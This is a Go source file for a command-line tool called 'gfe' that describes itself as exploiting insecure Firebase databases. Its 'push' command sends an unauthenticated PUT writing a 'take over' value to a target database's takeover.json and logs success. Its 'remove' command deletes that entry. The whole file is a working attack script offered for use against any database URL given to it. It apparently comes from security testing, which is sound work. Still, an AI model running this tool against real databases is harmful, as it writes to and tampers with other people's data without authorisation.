package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/alecthomas/kong"
	"github.com/common-nighthawk/go-figure"
	"github.com/rs/zerolog/log"
	"io/ioutil"
	"net/http"
	"time"
)

var cli struct {
	Push struct {
		Url string `help:"Firebase database url." short:"u" required:""`
	} `cmd:"" help:"Push data to database."`
	Remove struct {
		Url string `help:"Firebase database url." short:"u" required:""`
	} `cmd:"" help:"Remove exploit data from database."`
}

type TakeOver struct {
	Value string `json:"value"`
}

func showBanner() {
	banner := figure.NewFigure("gfe", "", true)
	banner.Print()
	fmt.Println()
}

func pushData(firebaseURL string) error {
	if firebaseURL == "" {
		return errors.New("firebase url is empty")
	}

	client := &http.Client{
		Timeout: time.Second * 5,
	}

	takeover := TakeOver{
		Value: "take over",
	}

	reqBody, err := json.Marshal(takeover)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("PUT", fmt.Sprintf("%s/takeover.json", firebaseURL), bytes.NewBuffer(reqBody))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")
	res, err := client.Do(req)
	if err != nil {
		return err
	}

	if res.StatusCode == 401 {
		return errors.New("permission denied")
	} else if res.StatusCode == 404 {
		return errors.New("database not found")
	}

	defer func() {
		err = res.Body.Close()
	}()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return err
	}
	log.Info().Str("file", "main").Msg(fmt.Sprintf("%s is exploited successfully.", firebaseURL))
	log.Debug().Str("file", "main").Msg(fmt.Sprintf("%s", body))
	return nil
}

func removeData(firebaseURL string) error {
	if firebaseURL == "" {
		return errors.New("firebase url is empty")
	}

	client := &http.Client{
		Timeout: time.Second * 5,
	}

	req, err := http.NewRequest("DELETE", fmt.Sprintf("%s/takeover.json", firebaseURL), nil)
	req.Header.Set("Content-Type", "application/json")
	res, err := client.Do(req)
	if err != nil {
		return err
	}

	if res.StatusCode == 401 {
		return errors.New("permission denied")
	} else if res.StatusCode == 404 {
		return errors.New("database not found")
	}

	log.Info().Str("file", "main").Msg(fmt.Sprintf("Exploit data is removed from %s.", firebaseURL))
	return nil
}

func main() {
	var firebaseURL string

	showBanner()

	ctx := kong.Parse(&cli,
		kong.Name("gfe"),
		kong.Description("exploit insecure firebase databases"),
		kong.UsageOnError(),
		kong.ConfigureHelp(kong.HelpOptions{
			Compact: true,
			Summary: true,
		}))

	switch ctx.Command() {
	case "push":
		firebaseURL = cli.Push.Url
		err := pushData(firebaseURL)
		if err != nil {
			log.Error().Stack().Str("file", "main").Msg(err.Error())
		}

	case "remove":
		firebaseURL = cli.Remove.Url
		err := removeData(firebaseURL)
		if err != nil {
			log.Error().Stack().Str("file", "main").Msg(err.Error())
		}
	}
}